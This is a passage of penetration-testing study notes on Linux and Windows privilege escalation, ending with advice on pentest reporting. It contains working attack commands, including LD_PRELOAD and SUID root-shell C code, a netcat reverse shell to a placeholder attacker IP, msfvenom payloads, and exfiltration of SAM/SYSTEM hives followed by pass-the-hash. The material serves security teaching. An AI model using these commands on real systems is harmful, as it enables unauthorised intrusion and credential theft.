For example, if vim or nano can use sudo, then we can add a user in `/etc/passwd` or change password hashes in `/etc/shadow`.

#### SUID / SGID binaries

Binaries that have the SUID or SGID flag set can be listed with `find / -type f -perm -04000 -ls 2>/dev/null` (`02000` for SGID).  
Just like binaries that can be run with sudo permissions, these binaries run as root if their owner or group is root.  
We can also check in GTFOBins which ones can escalate permissions.  

For example, if the `base64` binary has the SUID bit set, we can encode and decode any file to show its content : 
```shell
base64 /etc/shadow | base64 -d
```

#### LD_PRELOAD permission 

The LD_PRELOAD permission allows the user to preload shared libraries with the sudo command.  
We know if the current user has this permission by looking for `env_keep+=LD_PRELOAD` in the output of `sudo -l`.   

When a user has this permission, we can exploit it by creating a custom C library that starts a root shell : 
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

This can then be compiled into a share object (.so file) and preloaded with a program we have sudo permission on :
```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

#### Binaries with Capabilities

System administrator can set a capability to a binary to allow it to perform certain tasks that it would not be allowed to otherwise.  
This grants less power to the binary than setting its SUID or SGID bit, as only one special capability is allowed.  

Binaries that have capabilities can be listed with : `getcap -r / 2>/dev/null`

Some binaries that have the `cap_setuid` capability can be exploited for privilege escalation by changing their own SUID bit.  
GTFOBins also provides some commands to leverage them.  

For example, if `vim` has the `cap_setuid` capability and is compiled with Python support, we can open a root shell with :
```shell
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

#### Crontabs

In some cases, crontabs can also be used for privilege escalation.  
The Crontab mechanism itself is not vulnerable, but we can leverage a crontab that calls a vulnerable script.  
The `/etc/crontab` file shows system-wide crontabs.  
If we find a crontab running with root that calls a script that we can edit, we can replace its content to open a reverse-shell.

#### PATH variable

If we are able to write to any folder listed in the PATH variable, we may be able to get a custom script run as root.  
Scripts running as root calling commands without the full executable path use the PATH variable to resolve its location.  
If we are able to write a custom executable (for example a copy of `/bin/bash`) with the same name in a folder higher in the PATH, we can trick the script to use it instead.  

Another potential solution is to locally modify the PATH variable by adding a custom folder at the very beginning.  
This does not often work against SUID binaries though, because most of them sanitize their environment.

#### NFS configuration

If a machine acts as a NFS server, its NFS configuration can be checked in `/etc/exports`.  
By default, NFS changes the root user to `nfsnobody` and strips any file from operating with root privileges.  
However, the `no_root_squash` option can be set on a folder that the NFS server exposes to prevent this squash.  

When the `no_root_squash` option is set on a writable share, we can create an executable with the SUID bit set, and execute it on the NFS server.  

```shell
# from attacking machine : list mountable NFS shares
showmount -e <NFS_SERVER_IP>

# mount a share with the no_root_squash option, here we assume it is /backup (can be seen from the server in /etc/exports)
mkdir /tmp/backup
mount -o rw <NFS_SERVER_IP>:/backup /tmp/backup
```

From the attacker machine, we can compile a program that opens a bash shell with SUID :
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

We can go to the mounted folder, compile this program there and set its SUID bit :
```shell
cd /tmp/backup
gcc myshell.c -o myshell -w
chmod +s myshell
mv myshell /tmp/backup
```

Then from the compromised account on the NFS server we can execute it to open a root shell.


### Windows Enumeration

In Windows, users can be categorized in the following groups :
- Administrators : can change any system configuration parameter and access any file
- Users : can access the computer and perform limited tasks, usually no permanent change to the system, and limited access to files

The following Windows built-in accounts are also used in privilege escalation :
- SYSTEM/LocalSystem : used by the OS for internal tasks, full access to file and resources on the host with higher privilege than administrators
- Local Service : default account running Windows services with minimum privilege and anonymous connections to the network
- Network Service : default account running Windows services with minimum privilege and using the computer's credentials for connections to the network

The following automated enumeration tools can find potential privilege escalation paths :
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) : Windows equivalent of LinPEAS
- [PrivescCheck](https://github.com/itm4n/PrivescCheck) : PowerShell script to identify local privilege escalation
- [WES-NG](https://github.com/bitsadmin/wesng) (Windows Exploit Suggester - New Gen) : Python script running on the attacker machine to identify privilege escalation paths.  
  We need to run `systeminfo > systeminfo.txt` on the target machine, send the output to the attacker machine, then run `wes.py --update ; wes.py systeminfo.txt`
- Metasploit `multi/recon/local_exploit_suggester` module when we already have a Meterpreter session on the target


### Windows Privilege Escalation Techniques

#### Unattended Windows Installation

  Administrators can send an image to a large number of hosts, that is called "unattended installation".  
  If they do, they may leave the files used for initial setup on the machine, which may contain credentials :  
  - C:\Unattend.xml 
  - C:\Windows\Panther\Unattend.xml
  - C:\Windows\Panther\Unattend\Unattend.xml
  - C:\Windows\system32\sysprep.inf
  - C:\Windows\system32\sysprep\sysprep.xml


#### PowerShell History

  The PowerShell command history of the current user is stored in Windows and can be accessed by a standard user.  
  Sometimes it may contain a password that was input directly in a command.  
  ```shell
  # command for cmd.exe
  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

  # command for PowerShell
  type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  ```


#### Saved Windows Credentials

  Windows automatically saves some credentials for some targets.  
  We cannot display the passwords, but we can display the username and target, and run  command as these users :
  ```shell
  cmdkey /list                            # list all saved credentials
  runas /savecred /user:admin cmd.exe     # run a command prompt as one of the user with saved credentials
  ```


#### IIS Configuration

  IIS (Internet Information Services) is the default web server on Windows.  
  Its configuration file `web.config` sometimes contains credentials, and is usually located in one of :
  - C:\inetpub\wwwroot\web.config
  - C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config


#### Credentials stored in Putty
  Putty stores configuration, including cleartext proxy authentication credentials, in the Windows registry.  
  Any other application storing credentials would also expose a way to access these credentials.  
  ```shell
  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
  ```


#### Schedule Tasks

  If a scheduled task is missing a binary or executes a binary that can be modified, we can add custom commands to it.  
  We can list all the tasks and check the permission on their "Task to Run" executable.  
  ```shell
  schtasks /query /fo list /v          # display scheduled tasks info formatted as a list (including Task to Run)
  icacls <EXECUTABLE>                  # display permissions for the executable
                                       # Shows F for full-access and RX fr Read and Execute
  ```
  If our user group has permission to write the executable, we can replace its content with a reverse-shell.  
  Assuming we have the netcat binary available (nc64.exe), we can run : 
  ```shell
  echo "c:\tools\nc64.exe -e cmd.exe <ATTACKER_IP> 4444" > <EXECUTABLE>     # replace the executable by a reverse shell
  # on the attacker machine, we need to start a listener on port 4444
  schtasks /run /tn <TASK_NAME>                                             # run the task if we can (otherwise wait for it to run on schedule)
  ```


#### Insecure permissions on services

  We can see the configuration of a Windows service with `sc.exe qc <SERVICE_NAME>` (or in the registry).  
  This shows the name of the binary used by the service, and the user it runs as.  
  We can check the permissions of the binary with `icacls <BINARY>`.  
  If this shows that we can modify it, then the service is insecure and we can replace its binary by a custom one.  
  We can create a custom payload that opens a reverse shell with MsfVenom : 
  ```shell
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4445 -f exe-service -o revshell.exe
  ```
  The listener on the attacker machine can use either the Metasploit multi-handler or a simple `nc -lvnp 4445` command.  
  Move that payload to the Windows machine (with a Python HTTP server for ex), replace the service file and restart the service : 
  ```shell
  icacls <BINARY> /grant Everyone:F    # grant permission to the service user to execute the binary to start the service
  sc.exe stop <SERVICE_NAME>
  sc.exe start <SERVICE_NAME>
  ```
  

#### Unquoted service paths

  On Windows, services can have spaces in their executable path in the Windows registry.  
  If a service name has spaces and is not quoted, there is a known vulnerability.  
  An attacker can add a script and get it executed instead of the actual service executable.  
  For example if the service executable is `C:\Program Files\MyService\service.exe`, Windows will first look for `C:\Program.exe`.  
  If the attacker creates that file, Windows will execute it with Systems permissions instead of the actual service.  
  All unquoted services containing a space can be listed with a PowerShell script (not 100% accurate but good enough) : 
  ```shell
  Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {
      $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'
  } | select Name,DisplayName,StartMode,PathName
  ```
  A malicious `Program.exe` file can be crafted with MsfVenom (same as above) and sent to the machine.     
  By setting its permissions to full for everyone and moving it to `C:\Program.exe` it will be executed when the service starts.  
  Note that usually `C:\Program Files` is not writable by normal users, we will usually target other custom locations.
  

#### Invalid Service Permission Config

  If the permissions for the service itself (not its binary) are incorrect, we can reconfigure it to run another executable.  
  We can check the permissions of a service with the `accesschk64.exe` tool (part of the Sysinternal suite) :
  ```shell
  accesschk64.exe -qlc <SERVICE_NAME>
  ```
  If this shows that the BUILTIN\Users group has permissions to write, then we can modify the executable.  
  Create a malicious payload opening a reverse shell (same as above) and move it to the target machine.  
  Then reconfigure the service to run it instead of its original executable :
  ```shell
  icacls <BINARY> /grant Everyone:F
  sc.exe config <SERVICE_NAME> binPath= <BINARY> obj= LocalSystem
  ```
  Ensure that you have a running listener on the attacking machine, then bounce the service to receive a reverse shell : 
  ```shell
  sc.exe stop <SERVICE_NAME>
  sc.exe start <SERVICE_NAME> 
  ```


#### Windows Privileges

  On Windows, some accounts can have some privileges, which are special permissions to perform certain actions.  
  The privileges that a user is granted can be listed with : `whoami /priv`  
  A privilege shown as Disabled means the privilege is granted but not enabled (so still possibly exploitable), a normal user would not even see it listed.   
  The full list of existing privileges is described on the [Microsoft website](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).  
  Many of these privileges can be abused for privilege escalation.  
  A list of potential privilege escalation paths using privileges is available on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) GitHub page.  
 
 
- **SeBackup / SeRestore**  
  These privileges allow the user to read and write any file in the system, ignoring the DACL in place.  
  It makes it trivial to escalate privileges, for example by copying the SAM and SYSTEM registry hives (snapshots) to extract the Administrator password hash.    
  The SAM hive contains the user account info and password encrypted, and the system hive contains the boot key (or SysKey) needed to decrypt it.
  ```shell
  reg save hklm\system C:\Users\<MY_USER>\system.hive
  reg save hklm\sam C:\Users\<MY_USER>\sam.hive
  ```
  We can spawn a temporary SMB server using Impacket on the attacker machine for the Windows machine to send its HIVE files : 
  ```shell
  # start a local SMB server with Impacket on a folder called tmpshare accessible via \\<ATTACKER_IP>\public\
  # we need to specify the username and password of the Windows user
  mkdir tmpshare
  python3.9 /opt/impacket/examples/smbserver.py -smb2support -username <USER> -password <PASSWORD> public tmpshare
  ```
  Then from the Windows machine, we can copy the HIVE files via SMB to the attacker machine : 
  ```shell
  copy C:\Users\<MY_USER>\sam.hive    \\<ATTACKER_IP>\public\
  copy C:\Users\<MY_USER>\system.hive \\<ATTACKER_IP>\public\
  ```
  We can then decrypt the admin password hash with Impacket :  
  ```shell
  # Use Impacket to extract the Administrator password hash (and all other users) from the SAM and system hives
  cd tmpshare/
  python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
  
  # use Impacket to get a shell on the admin account with a pass-the-hash attack
  python3.9 /opt/impacket/examples/psexec.py -hashes <ADMIN_HASH> administrator@<TARGET_IP>
  ``` 


- **SeTakeOwnership**  
  This privilege allows the user to take ownership of any object on the system (files, registry keys...).  
  This allows easy privilege escalation, for example by taking ownership of an executable used by a service running as SYSTEM and modifying it to a reverse shell.  
  Let's take ownership of the built-in `Utilman.exe` executable that runs with SYSTEM privilege.  
  ```shell
  cd C:\Windows\System32
  takeown /f Utilman.exe                   # take ownership of the executable
  icacls Utilman.exe /grant <USER>:F       # grant ourselves permissions over that executable
  copy cmd.exe Utilman.exe                 # replace the executable by a cmd.exe shell
  ```

- **SeImpersonate / SeAssignPrimaryToken**  
  These privileges allow a process to impersonate other users and act on their behalf, by spawning processes under the security context of this user.  
  This is useful for a FTP server for example, so it can impersonate the user accessing it to show only what it can access.  
  This privilege can be abused using **RogueWinRM** attacking the BITS service to obtain a reverse shell.


#### Unpatched Software

Unpatched software can contain some vulnerabilities that can be exploited for privilege escalation.  
We can list most of the installed programs with their versions with : `wmic product get name,version,vendor`.  
From these versions, we can check on Google or ExploitDB if any has some known vulnerabilities.


## Reporting

- Create a clear executive summary with business impact (understandable by non-tech management people)
- Detail the scope and methodology
- Present findings and evidence
- Prioritize vulnerabilities (critical / high / medium / low)
- Provide actionable recommendations
- Assess the overall security posture
- Include any limitation (off-limit hours / machines / methods...)

### Documenting the attacks

- attack path : detailed record of all the steps taken to exploit vulnerabilities and achieve objectives
- low-level diagram : represents the technical details of the attack, showing the network layout, the exploited vulnerabilities and the taken actions 
- storyboard : high-level visual representation of the attack (like a comic strip)


## Reference Documentation

- **CERT** (Computer Emergency Response Team)  
  Website maintained by the US federal government listing all known vulnerabilities identified, publicly or added by security partners.  
  http://cisa.gov/uscert


- **JPCERT** (Japanese CERT)  
  List alerts and advisories about viruses and security issues on the rise.  
  https://www.jpcert.or.jp/


- **NVD** (National Vulnerability Database)  
  Provided by the NIST (National Institute of Standards and Technology)  
  It associates a CVSS score to each CVE.  
  https://nvd.nist.gov/


- **CAPEC** (Common Attack Pattern Enumeration and Classification)  
  Resource to understand common attack patterns, that attackers use and penetration testers can be asked to emulate.  
  https://capec.mitre.org/

